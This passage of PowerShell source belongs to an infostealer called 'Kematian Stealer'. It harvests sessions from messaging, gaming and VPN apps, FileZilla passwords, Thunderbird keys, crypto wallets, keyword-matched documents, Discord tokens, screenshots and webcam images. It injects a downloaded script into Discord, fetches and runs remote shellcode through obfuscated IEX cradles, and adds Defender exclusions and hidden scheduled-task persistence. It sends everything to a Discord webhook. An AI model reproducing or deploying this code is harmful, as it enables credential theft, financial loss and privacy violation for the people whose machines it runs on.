        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }

    # Ubisoft Session Stealer
    function ubisoftstealer {
        $processname = "upc"
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }

    # EA Session Stealer
    function electronic_arts {
        $processname = "eadesktop"
        $eafolder = "$env:localappdata\Electronic Arts"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        if (!(Test-Path $ea_session)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        New-Item -ItemType Directory -Force -Path $ea_session
        Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
    }

    # Growtopia Stealer
    function growtopiastealer {
        $processname = "growtopia"
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        New-Item -ItemType Directory -Force -Path $growtopia_session
        Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
    }

    function battle_net_stealer {
        $processnames = @("Battle.net", "Agent")
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        foreach ($process in $processnames) { Stop-Process -Name $process -ErrorAction 'SilentlyContinue' -Force }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }


    # All VPN Sessions

    # NordVPN 
    function nordvpnstealer {
        $processname = "nordvpn"
        $nordvpnfolder = "$env:localappdata\nordvpn"
        if (!(Test-Path $nordvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $nordvpn_account = "$folder_vpn\NordVPN"
        New-Item -ItemType Directory -Force -Path $nordvpn_account
        $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
        Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
    }


    # ProtonVPN
    function protonvpnstealer {
        $processname = "protonvpn"
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
    }


    #Surfshark VPN
    function surfsharkvpnstealer {
        $processname = "Surfshark"
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
	
	function openvpn_stealer {
        $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
        if (!(Test-Path $openvpnfolder)) { return }
        $openvpn_accounts = "$folder_vpn\OpenVPN"
        New-Item -ItemType Directory -Force -Path $openvpn_accounts
        Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
    }
   
    # FTP Clients 
   
    # Filezilla 
    function filezilla_stealer {
    $FileZillafolder = "$env:appdata\FileZilla"
    if (!(Test-Path $FileZillafolder)) { return }
    $filezilla_hosts = "$filezilla_bkp"
    $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
    $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
	function ParseServerInfo {
    param ([string]$xmlContent)
    $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
    $serverHost = $matches.Groups[1].Value
    $serverPort = $matches.Groups[2].Value
    $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
    # Check if both User and Pass are blank
    if ([string]::IsNullOrWhiteSpace($serverUser)) {
        return @"
Host: $serverHost
Port: $serverPort

"@
    }
    # If User is not blank, continue with authentication details
    $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
    $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
    return @"
Host: $serverHost
Port: $serverPort
User: $serverUser
Pass: $decodedPass

"@
}
    $serversInfo = @()
    foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
    if (Test-Path $xmlFile) {
    $xmlContent = Get-Content -Path $xmlFile
    $servers = [System.Collections.ArrayList]@()
    $xmlContent | Select-String -Pattern "<Server>" -Context 0,10 | ForEach-Object {
    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
    $servers.Add($serverInfo) | Out-Null
     }
    $serversInfo += $servers -join "`n"
        }
    }
    $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
}

    function Export-Data_Sessions {        
        telegramstealer
        elementstealer
        icqstealer
        signalstealer
        viberstealer
        whatsappstealer
        skype_stealer
        steamstealer
        minecraftstealer
        epicgames_stealer
        ubisoftstealer
        electronic_arts
        growtopiastealer
        battle_net_stealer
        nordvpnstealer
        protonvpnstealer
        surfsharkvpnstealer 
        filezilla_stealer
        pidgin_stealer
        openvpn_stealer		
    }
    Export-Data_Sessions

    # Thunderbird Exfil
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
    }

    function Invoke-Crypto_Wallets {
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
            New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
            New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
            New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
            New-Item -Path "$folder_crypto\bytecoin" -ItemType Directory | Out-Null
            Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$folder_crypto\bytecoin" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
            New-Item -Path "$folder_crypto\Coinomi" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Coinomi" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
            New-Item -Path "$folder_crypto\DashCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\DashCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
            New-Item -Path "$folder_crypto\Electrum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Electrum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
            New-Item -Path "$folder_crypto\Ethereum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$folder_crypto\Ethereum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
            New-Item -Path "$folder_crypto\exodus.wallet" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$folder_crypto\exodus.wallet" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
            New-Item -Path "$folder_crypto\Guarda" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Guarda" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
            New-Item -Path "$folder_crypto\liberty.jaxx" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\liberty.jaxx" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
            New-Item -Path "$folder_crypto\Litecoin" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\Litecoin" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
            New-Item -Path "$folder_crypto\Monero" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$folder_crypto\Monero" -Recurse  -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
            New-Item -Path "$folder_crypto\Zcash" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$folder_crypto\Zcash" -Recurse -Force
        }
    }
    Invoke-Crypto_Wallets

    # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
    #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.

    # Fix webcam hang with unsupported devices
	
    Write-Host "[!] Capturing an image with Webcam !"
    $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
    $invokewebcam.WaitForExit()
    Write-Host "[!] Webcam captured !" -ForegroundColor Green

    # Works since most victims will have a weak password which can be bruteforced
    #function ExportPrivateKeys {
    #    $privatekeysfolder = "$important_files\Certificates & Private Keys"
    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force
    #    $sourceDirectory = "$env:userprofile"
    #    $destinationDirectory = "$important_files\Certificates & Private Keys"
    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
    #    $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
    #    foreach ($file in $foundFiles) {
    #        Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
    #    }
    #}
    #ExportPrivateKeys

    Function Invoke-GrabFiles {
        $grabber = @(
            "2fa",
            "acc",
            "atomic wallet",
            "account",
            "backup",
            "bank",
            "bitcoin",
            "backupcode",
            "bitwarden",
            "bitcoin",
            "code",
            "coinbase",
            "crypto",
            "dashlane",
            "default",
            "discord",
            "disk",
            "eth",
            "exodus",
            "facebook",
            "fb",
            "funds",
            "keepass",
            "keepassxc",
            "keys",
            "lastpass",
            "login",
            "mail",
            "memo",
            "metamask",
            "note",
            "nordpass",
            "pass",
            "paypal",
            "private",
            "pw",
            "recovery",
            "remote",
            "secret",
            "passphrase",
            "seedphrase",
            "wallet seed",
            "server",
            "syncthing",
            "smart contract",
            "trading",
            "token",
            "wal",
            "wallet"
        )
        $dest = $important_files
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
    (Get-ChildItem -path $paths -Include @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")  -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    Invoke-GrabFiles

    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }


    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

    foreach ($path in $discPaths) {
        $skibidipath = Join-Path $locAppData $path
        if (-not (Test-Path $skibidipath)) {
            continue
        }
        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                $files = Get-ChildItem $_.FullName
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
                        if ($content -ne "") {
                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
                            $replacedContent | Set-Content -Path $file.FullName -Force
                        }
                    }
                }
            }
        }
    }

    #try {
    #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    #}
    #catch {}
    
    #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
    
    Write-Host "`r `n"
    Write-Host "[!] Injecting Shellcode !"
    $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $proc.WaitForExit()
    Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green

    #$stdout = Get-Content ($PSCommandPath + ":stdout")
    #$outArray = $stdout -split "`n"
    ##for every line in outArray (line 1 = discord.json, line 2 = contents of discord.json base64 encoded gunzip)
    #for ($i = 0; $i -lt $outArray.Length; $i += 2) {
    #    $file = $outArray[$i]
    #    Write-Host $file
    #    $content = $outArray[$i + 1]
    #    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
    #    #ungzip the content
    #    $content = [System.Text.Encoding]::UTF8.GetString([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String($content)), [System.IO.Compression.CompressionMode]::Decompress))
    #    $content | Out-File $file -Force
    #}

    $main_temp = "$env:localappdata\temp"
	    
    function Get-ScreenCapture 
    { 
    begin { 
        Add-Type -AssemblyName System.Drawing, System.Windows.Forms 
        Add-Type -AssemblyName System.Drawing 
        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |  
            Where-Object { $_.FormatDescription -eq "JPEG" } 
    } 
    process { 
    Start-Sleep -Milliseconds 44 
    [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    
    Start-Sleep -Milliseconds 550 
    $bitmap = [Windows.Forms.Clipboard]::GetImage()     
    $ep = New-Object Drawing.Imaging.EncoderParameters   
    $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)    
    $bitmap.Save("$main_temp\screenshot.png", $jpegCodec, $ep) 
    } 
    }							 			
    Get-ScreenCapture 

    Move-Item "$main_temp\discord.json" $folder_general -Force    
    Move-Item "$main_temp\screenshot.png" $folder_general -Force
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)
	
	Write-Host "[!] Getting information about the extracted data !"
	Write-Host "`r `n"
	
    # Send info about the data in the Kematian.zip
	function kematianinfo {	
	$messaging_sessions_info = if (Test-Path $folder_messaging) {
    $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
    if ($messaging_sessions_content) {
            $messaging_sessions_content -join ' | '
        } else {
            'False'
        }
     } else {
        'False'
     }

     $gaming_sessions_info = if (Test-Path $folder_gaming) {
        $gaming_sessions_content = Get-ChildItem -Path $folder_gaming -Directory | ForEach-Object { $_.Name -replace '\..+$' }
        if ($gaming_sessions_content) {
            $gaming_sessions_content -join ' | '
        } else {
            'False'
        }
     } else {
        'False'
     }

     $wallets_found_info = if (Test-Path $folder_crypto) {
        $wallets_found_content = Get-ChildItem -Path $folder_crypto -Directory | ForEach-Object { $_.Name -replace '\..+$' }
        if ($wallets_found_content) {
            $wallets_found_content -join ' | '
        } else {
            'False'
        }
     } else {
        'False'
     }

     $vpn_accounts_info = if (Test-Path $folder_vpn) {
        $vpn_accounts_content = Get-ChildItem -Path $folder_vpn -Directory | ForEach-Object { $_.Name -replace '\..+$' }
        if ($vpn_accounts_content) {
            $vpn_accounts_content -join ' | '
        } else {
            'False'
        }
    } else {
        'False'
    }

    $email_clients_info = if (Test-Path $folder_email) {
        if ((Get-ChildItem -Path $folder_email).Count -gt 0) {
            'True'
        } else {
            'False'
        }
    } else {
        'False'
    }

    $important_files_info = if (Test-Path $important_files) {
        $file_count = (Get-ChildItem -Path $important_files -File).Count
        if ($file_count -gt 0) {
        ($file_count)
        } else {
            'False'
        }
    } else {
        'False'
    }

    $browser_data_info = if (Test-Path $browser_data) {
    $browser_data_content = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*" -File | ForEach-Object { $_.Name -replace '\..+$' }
    $browser_data_content = $browser_data_content -replace "^cookies_netscape_|-Browser$", ""
    if ($browser_data_content) {
        $browser_data_content -join ' | '
    } else {
        'False'
    }
    } else {
    'False'
    }

    $filezilla_info = if (Test-Path $filezilla_bkp) {
        if (Test-Path "$filezilla_bkp\Hosts.txt") {
            'True'
        } else {
            'False'
        }
    } else {
        'False'
    }

    # Add data to webhook
    $webhookData = @"
Messaging Sessions: $messaging_sessions_info
Gaming Sessions: $gaming_sessions_info
Crypto Wallets: $wallets_found_info
VPN Accounts: $vpn_accounts_info
Email Clients: $email_clients_info
Important Files: $important_files_info
Browser Data: $browser_data_info
FileZilla: $filezilla_info
"@

     return $webhookData
	 }	 
	$kematainwebhook = kematianinfo
	
	# Send discord tokens in webhook message 
    $discord_tokens = if (Test-Path "$folderformat\discord.json") {
        $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
        $tokenMatches = [regex]::Matches($jsonContent, '"token": "(.*?)"')
    
        if ($tokenMatches.Count -gt 0) {
            $tokens = foreach ($match in $tokenMatches) {
                $token = $match.Groups[1].Value
                $token
            }
            $tokens -join "`n`n"
        } else {
            'False'
        }
    } else {
        'False'
    }

	
    $embed_and_body = @{
        "username"    = "Kematian"
        "content"     = "@everyone"
        "title"       = "Kematian Data Extractor"
        "description" = "Kematian"
        "color"       = "15105570"
        "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
        "url"         = "https://discord.com/invite/WJCNUpxnrE"
        "embeds"      = @(
            @{
                "title"       = "Kematian Stealer"
                "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
                "description" = "New victim info collected !"
                "color"       = "15105570"
                "footer"      = @{
                    "text" = "Made by Kdot, Chainski and EvilByteCode"
                }
                "thumbnail"   = @{
                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
                }
                "fields"      = @(
                    @{
                        "name"  = ":satellite: Network"
                        "value" = "``````$networkinfo``````"
                    },
                    @{
                        "name"  = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name"  = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name"  = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name"  = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    },
                    @{
                        "name"  = ":wireless: WiFi"
                        "value" = "``````$wifipasswords``````"
                    }
                    @{
                        "name" = ":file_folder: Kematian File Info"
                        "value" = "``````$kematainwebhook``````"
                    }
					@{
                        "name" = ":key: Discord Token(s)"
                        "value" = "```````n$discord_tokens``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
	
    # send webcam
    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
    foreach ($item in $items) {
    $name = $item.Name
    curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | out-null
    Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
    }

    # send screenshot
    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"## :desktop: Screenshot\n\n\`"}" -F "file=@\`"$folder_general\screenshot.png\`"" "$($webhook)" | Out-Null

    # send extracted data
    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook
    
	Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
    Write-Host "`r `n"
	
	# cleanup
    Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
    Remove-Item "$folder_general" -Force -Recurse
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
	if ($persistence) {
	Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"	
    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
    New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
    # Hidden Directory
    $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
    $KDOT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Kematian\Kematian.ps1" -Force
    $task_name = "Kematian"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
    Write-Host "[!] Task Created" -ForegroundColor Green
	}
    if ($blockhostsfile) {
	$link = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1")
	iex (iwr -uri $link -useb)
    
    }
    Backup-Data
}

if (CHECK_AND_PATCH -eq $true) {
    if ($debug -eq $true) {
        AUTOUPDATE
    }
    else {
        AUTOUPDATE
    }    
    if ($debug) {
        Write-Host "[!] Terminate This Process and observe the next one"
    } else {
        [ProcessUtility]::MakeProcessKillable()
    }
    $script:SingleInstanceEvent.Close()
    $script:SingleInstanceEvent.Dispose()
    #removes history
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
    if ($melt) {ri $pscommandpath -force}
} else {
    Write-Host ("[!] Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIWogYJKoZIhvcNAQcCoIIWkzCCFo8CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU5kKkcKGtofPqkdR7fYj/Wr46
# KFigghDvMIIDAjCCAeqgAwIBAgIQQWmfkCdPgq5NjgKQlpxwcjANBgkqhkiG9w0B
# AQsFADAZMRcwFQYDVQQDDA5LZW1hdGlhbiwgSW5jLjAeFw0yNDA1MTIxODM3MTha
